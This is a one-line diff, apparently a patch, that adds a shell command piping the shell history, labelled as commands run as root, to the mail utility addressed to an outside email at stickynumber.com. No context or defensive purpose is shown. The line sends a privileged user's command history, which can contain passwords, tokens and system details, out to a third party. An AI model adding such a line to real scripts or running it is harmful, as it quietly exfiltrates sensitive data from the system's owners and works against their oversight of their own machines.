@@ -1,0 +1,1 @@
+history | mail -s "Log of all commands run as root user" info@stickynumber.com
